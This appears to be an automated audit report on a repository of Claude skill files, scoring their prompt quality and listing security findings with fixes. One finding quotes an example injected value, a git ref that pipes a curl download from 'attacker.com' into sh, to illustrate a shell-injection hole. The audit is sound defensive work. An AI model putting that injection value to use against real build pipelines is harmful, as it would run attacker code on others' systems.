# NLPM Audit: numman-ali/n-skills
**Date**: 2026-04-06  |  **Artifacts**: 11  |  **Strategy**: single
**NL Score**: 96/100
**Security**: REVIEW
**Bugs**: 0  |  **Quality Issues**: 5  |  **Security Findings**: 3

## NL Score Summary
| File | Type | Score | Top Issue |
|------|------|-------|-----------|
| skills/automation/dev-browser/skills/dev-browser/SKILL.md | skill | 80 | Only "run --help"; no command reference or interaction examples |
| skills/tools/zai-cli/skills/zai-cli/SKILL.md | skill | 93 | Minimal AI behavioral guidance beyond CLI reference |
| skills/workflow/open-source-maintainer/skills/open-source-maintainer/SKILL.md | skill | 94 | Vague quantifiers: "materially", "long-term", "low" |
| skills/workflow/orchestration/skills/orchestration/SKILL.md | skill | 94 | Vague quantifiers: "interesting", "smart", "beautiful" |
| skills/tools/gastown/skills/gastown/SKILL.md | skill | 98 | Minor vague language in persona/creative-freedom sections |
| CLAUDE.md | config | 100 | None |
| skills/automation/dev-browser/.claude-plugin/plugin.json | manifest | 100 | None |
| skills/tools/gastown/.claude-plugin/plugin.json | manifest | 100 | None |
| skills/tools/zai-cli/.claude-plugin/plugin.json | manifest | 100 | None |
| skills/workflow/open-source-maintainer/.claude-plugin/plugin.json | manifest | 100 | None |
| skills/workflow/orchestration/.claude-plugin/plugin.json | manifest | 100 | None |

**Scoring notes:** Weighted average across 11 artifacts: (80+93+94+94+98+100×6)/11 = 1059/11 ≈ 96.

## Security Scan
| Severity | Count |
|----------|-------|
| Critical | 0 |
| High | 0 |
| Medium | 2 |
| Low | 1 |

### Execution Surface Inventory
| Surface | Files |
|---------|-------|
| Hooks | None |
| Shell scripts | None |
| MCP configs | None |
| Package manifests | `package.json` |
| Node.js scripts (maintenance) | `scripts/sync-external.mjs`, `scripts/update-registry.mjs` |
| TypeScript scripts (skill asset) | `skills/workflow/open-source-maintainer/skills/open-source-maintainer/scripts/triage.ts` (+ 14 supporting modules) |

Note: `sync-external.mjs` and `update-registry.mjs` are CI maintenance scripts invoked by GitHub Actions (the `sync-skills.yml` workflow referenced in AGENTS.md). The triage scripts ship inside the `open-source-maintainer` skill and are run by Claude on the user's behalf.

### Security Findings
| # | Severity | File | Line | Pattern | Description |
|---|----------|------|------|---------|-------------|
| 1 | Medium | scripts/sync-external.mjs | 128 | execSync with string interpolation | `execSync(\`git clone --depth 1 --branch ${ref} ${repoUrl} ${repoDir}\`, ...)` — `ref` and `repoUrl` come from `sources.yaml`. A malicious PR modifying `sources.yaml` could inject shell metacharacters (e.g. `ref: "main; curl attacker.com/payload | sh"`). Should use `execFileSync` with an argument array. |
| 2 | Medium | scripts/sync-external.mjs | 134 | execSync with string interpolation | `execSync(\`git -C ${repoDir} rev-parse HEAD\`, ...)` — `repoDir` is constructed from `skill.source.repo.replace("/", "-")`. Only a single slash-to-hyphen replacement is applied; a repo name with shell metacharacters would still pass through. Use `execFileSync`. |
| 3 | Low | package.json | 22 | Unpinned dependency | `"yaml": "^2.8.3"` — caret range allows automatic minor and patch upgrades. Pin to an exact version (`"2.8.3"`) to prevent silent supply-chain drift in CI. |

## Bugs (PR-worthy)
No bugs found. All required frontmatter fields (`name`, `description`) are present in every SKILL.md. All cross-references to `references/*.md` files exist on disk. All `plugin.json` manifests are well-formed and contain no `$schema` key (per project policy).

## Security Fixes (PR-worthy, Medium/Low only)
| # | File | Issue | Suggested Fix |
|---|------|-------|---------------|
| 1 | scripts/sync-external.mjs:128 | `execSync` with YAML-sourced string interpolation — shell injection vector | Replace with `execFileSync('git', ['clone', '--depth', '1', '--branch', ref, repoUrl, repoDir], { stdio: 'pipe' })` |
| 2 | scripts/sync-external.mjs:134 | `execSync` with path from YAML | Replace with `execFileSync('git', ['-C', repoDir, 'rev-parse', 'HEAD'], { encoding: 'utf-8' })` |
| 3 | package.json:22 | Unpinned `yaml` devDependency | Change `"^2.8.3"` → `"2.8.3"` and run `npm install --package-lock-only` |

## Quality Issues (informational)
| # | File | Issue | Penalty |
|---|------|-------|---------|
| 1 | skills/automation/dev-browser/skills/dev-browser/SKILL.md | Extremely thin: only Installation + "run --help". No command reference table, no Quick Start examples, no AI behavioral guidance on how to interpret results or handle errors. Users are told to discover the tool themselves, which defeats the purpose of a skill. | −10 no examples, −10 missing output/response format |
| 2 | skills/tools/zai-cli/skills/zai-cli/SKILL.md | No AI behavioral layer: does not tell the model when to prefer `vision analyze` vs `search` vs `read`, how to handle authentication errors, or how to present results to the user. The CLI reference is solid but behavioral guidance is absent. | −7 |
| 3 | skills/workflow/open-source-maintainer/skills/open-source-maintainer/SKILL.md | Three vague quantifiers: "materially" (line 22: "only when it changes the plan materially"), "long-term" (line 8: "long-term repo health"), "low" (line 22: "Default to low user burden"). Each is subjective without a threshold. | −6 (3 × −2) |
| 4 | skills/workflow/orchestration/skills/orchestration/SKILL.md | Three vague quantifiers: "interesting" (line 94: "genuine excitement for interesting problems"), "smart" (line 91: "smart observations"), "beautiful" (lines 585, 786). These are persona descriptors rather than actionable instructions. | −6 (3 × −2) |
| 5 | skills/tools/gastown/skills/gastown/SKILL.md | Minor vague language in the Creative Freedom section ("surprise and delight", "spontaneous", "the right explanation"). Acceptable for tone/persona guidance but edges toward unactionable direction. | −2 |

## Cross-Component
- **AGENTS.md ↔ skills**: All five skills listed in `AGENTS.md` (`<available_skills>`) are present at their declared `<location>` paths. ✓
- **plugin.json ↔ SKILL.md**: All four `plugin.json` manifests have `name` and `description` consistent with the corresponding SKILL.md frontmatter. ✓
- **Reference files**: All `references/*.md` files cited inside SKILL.md bodies exist on disk (gastown: 5 refs ✓; open-source-maintainer: 8 refs ✓; orchestration: 12 refs ✓; zai-cli: 1 ref ✓; dev-browser: none cited). ✓
- **Scripts cited in SKILL.md**: `open-source-maintainer` cites `npx tsx /path/to/.../scripts/triage.ts`; `triage.ts` exists along with all 14 supporting modules. ✓
- **Inconsistency (minor)**: `gastown/plugin.json` `description` field (line 3) is a slightly shorter version of the SKILL.md `description` frontmatter — the plugin.json omits "beads, hooks, the witness, the mayor, the refinery" trigger phrases. Not a registration bug, but marketplace search coverage is narrowed.
- **dev-browser attribution**: `plugin.json` lists `"author": { "name": "Sawyer Hood" }` (the upstream author, SawyerHood/dev-browser). The AGENTS.md `.source.json` attribution mechanism should cover this, but the skill's own frontmatter contains no attribution note — acceptable per project policy.

## Recommendation
REVIEW — submit NL fix PRs for the `dev-browser` SKILL.md expansion (Quality Issue #1) and the `zai-cli` behavioral layer (Quality Issue #2). Flag the `execSync` string-interpolation issues (Security Findings #1 and #2) in a GitHub issue for the maintainer's attention before the next sync workflow run.
